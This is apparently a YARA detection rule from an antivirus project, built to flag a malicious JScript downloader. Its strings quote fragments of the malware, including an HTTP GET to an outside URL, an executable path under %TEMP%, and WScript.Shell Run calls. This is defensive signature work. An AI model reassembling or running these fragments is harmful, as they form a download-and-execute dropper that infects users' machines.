rule sig_20160328_1a040e04dbdcd0573c075fb40cf3f4e3 {
  meta:
    description = "datamaliciousorder - file 20160328_1a040e04dbdcd0573c075fb40cf3f4e3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "af0ecd650c36ddef8d1d02e8d35edf4f95a6e3f18b188db32d40fb916a4bff1e"

  strings:
    $s1  = "function Bhamgsple() {return Gqokglyrj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9AhoUANYGIYk2yX.exe\";};" fullword ascii
    $s2  = "Wfbcze[Nymkgmt](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Rgajceffmp](Mntmt() * 11)} while (Wfbcze[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Sziswls(Ruyrq, Tuazw){return Ruyrq - Tuazw;};" fullword ascii
    $s5  = "var Gqokglyrj = function Fsosr() {return WScript[Lbgtgluhsv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ebvykgf() {return ((Jpnlxf == true) && (Jpnlxf == Dblwtfv)) ? 1 : Qimoull;};" fullword ascii
    $s7  = "function Xawqvbait(Wdcxlr){Gqokglyrj[\"Run\"](Wdcxlr, Qimoull, Qimoull);};" fullword ascii
    $s8  = "var Lygvatmp = false;" fullword ascii
    $s9  = "function Zckqkdh(){return Lbgtgluhsv;};" fullword ascii
    $s10 = "var Rpjkycrgw = new this[\"Date\"]();" fullword ascii
    $s11 = " while (Srwjgwdzz){" fullword ascii
    $s12 = "Jpnlxf = true; " fullword ascii
    $s13 = "function Lhyou(Tcrceyjg) {var Znlsjxwyqs = (1, 2, 3, 4, 5, Tcrceyjg); return Znlsjxwyqs;};" fullword ascii
    $s14 = "function Byqnsmpqfe()" fullword ascii
    $s15 = "function Xxrhe(){return Sbqegrhqyk;};" fullword ascii
    $s16 = "var Dblwtfv = false;" fullword ascii
    $s17 = "function Mntmt(){return 22;};" fullword ascii
    $s18 = "var Jpnlxf = false;" fullword ascii
    $s19 = "Dblwtfv = true; " fullword ascii
    $s20 = "return Sziswls(Shhosyvyvz, Syrnmo);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}